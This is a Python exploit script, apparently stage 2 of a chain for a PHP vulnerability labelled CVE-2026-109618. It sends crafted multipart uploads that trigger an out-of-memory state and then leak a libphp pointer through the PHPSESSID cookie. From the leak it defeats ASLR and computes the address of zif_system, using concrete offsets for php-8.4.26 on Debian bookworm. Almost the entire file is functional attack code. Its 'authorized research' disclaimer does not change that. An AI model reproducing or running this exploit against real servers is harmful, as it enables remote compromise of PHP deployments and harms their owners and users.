#!/usr/bin/env python3
"""
CVE-2026-109618 -- Stage 2: libphp.so base leak via PHPSESSID cookie.

After stage 1 gives us the Zend MM chunk base, stage 2 leaks a
pDestructor pointer from within libphp.so. The low 12 bits of the
leaked pointer match zval_ptr_dtor's low 12 bits (0xb60), letting us
compute libphp's load base and defeat ASLR.

Profile: php-8.4.26-bookworm-amd64
  zval_ptr_dtor = 0x65eb60 (offset from libphp base)
  stage2_t = 406 (array index that yields the pDestructor)
  stage2_v = 16  (sub-array count at the target index)

For authorized security research and local lab use only.
"""

import socket
import struct
import sys
import time
from collections import Counter


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_oom_request(boundary, memory_limit_mb=8, oom_margin_mb=12):
    """Request A: trigger OOM to corrupt worker state."""
    body = b""
    for i in range(1001):
        body += make_part(boundary, f"f{i:04d}"[:5], b"x" * 39) + b"\r\n"
    body += make_part(boundary, "PHPSESSID", b"\x00") + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"
    body += make_part(boundary, "f", b"A" * 4096, filename="upload.bin") + b"\r\n"
    big_size = (memory_limit_mb + oom_margin_mb) * 1024 * 1024
    body += make_part(boundary, "huge", b"X" * big_size) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def build_stage2_request(boundary, sid, t_index=406, v_len=16):
    """Request B: leak pDestructor via Set-Cookie."""
    body = b""
    body += make_part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"

    for i in range(983):
        cnt = v_len if i == t_index else 1
        for j in range(cnt):
            body += make_part(boundary, f"a{i:04d}[{j}]", b"x" * 16) + b"\r\n"

    body += b"--" + boundary + b"--\r\n"
    return body


def send_request(host, port, path, boundary, body, timeout=120):
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        total = headers + body
        offset = 0
        while offset < len(total):
            sent = sock.send(total[offset:offset + 1048576])
            offset += sent
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return f"ERROR: {e}".encode()


def extract_cookie(resp):
    import urllib.parse
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            raw = line.split(b"PHPSESSID=")[1].split(b";")[0]
            try:
                return urllib.parse.unquote_to_bytes(raw.decode("latin-1"))
            except Exception:
                return raw
    return b""


def find_libphp_base(raw, dtor_offset=0x65eb60):
    """Check if bytes 8-16 of the cookie contain a pDestructor."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x10000 < p < 0x0001000000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


def find_chunk_base(raw):
    if len(raw) < 16:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x10000 < v < 0x0001000000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 4 else 0


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    boundary = b"S" * 17
    dtor_offset = 0x65eb60

    print("=" * 60)
    print("CVE-2026-109618: Stage 2 libphp Base Leak Test")
    print("=" * 60)
    print(f"Target: http://{host}:{port}{path}")
    print(f"Profile: php-8.4.26-bookworm-amd64")
    print(f"  zval_ptr_dtor = {hex(dtor_offset)}")
    print(f"  stage2_t = 406, stage2_v = 16")
    print()

    attempts = 5
    for attempt in range(1, attempts + 1):
        print(f"--- Attempt {attempt}/{attempts} ---")

        # Request A: OOM trigger
        print("  Request A (OOM)...")
        body_a = build_oom_request(boundary, 8, 12)
        resp_a = send_request(host, port, path, boundary, body_a, 120)
        oom = b"Allowed memory size" in resp_a
        print(f"    OOM: {oom}")
        if not oom:
            print("    [!] No OOM -- skipping")
            continue

        time.sleep(0.3)

        # Request B: libphp leak
        print("  Request B (libphp leak)...")
        body_b = build_stage2_request(boundary, "stage2-test", 406, 16)
        print(f"    Body: {len(body_b)} bytes")
        resp_b = send_request(host, port, path, boundary, body_b, 60)

        cookie = extract_cookie(resp_b)
        print(f"    Cookie: {len(cookie)} bytes")

        if len(cookie) > 8:
            print(f"    First 32 hex: {cookie[:32].hex()}")
            libphp = find_libphp_base(cookie, dtor_offset)
            chunk = find_chunk_base(cookie) if len(cookie) > 40 else 0

            if libphp:
                print(f"    [+] LIBPHP BASE: {hex(libphp)}")
                zif_system = libphp + 0x465370
                print(f"    [+] zif_system = {hex(zif_system)}")
            else:
                # Check all 8-byte windows for a match
                found = False
                for i in range(len(cookie) - 7):
                    p = int.from_bytes(cookie[i:i + 8], "little")
                    if 0x10000 < p < 0x0001000000000000 and (p & 0xFFF) == (dtor_offset & 0xFFF):
                        base = p - dtor_offset
                        if base & 0xFFF == 0:
                            print(f"    [+] LIBPHP BASE at cookie offset {i}: {hex(base)}")
                            print(f"    [+] zif_system = {hex(base + 0x465370)}")
                            found = True
                            break
                if not found:
                    print(f"    [-] No pDestructor match (low 12 bits != {hex(dtor_offset & 0xFFF)})")

            if chunk:
                print(f"    chunk_base: {hex(chunk)}")
        else:
            status = resp_b.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp_b else "empty"
            print(f"    Status: {status}")
            scookies = sum(1 for l in resp_b.split(b"\r\n") if l.lower().startswith(b"set-cookie:"))
            print(f"    Set-Cookie headers: {scookies}")

        print()

    print("Done.")


if __name__ == "__main__":
    main()
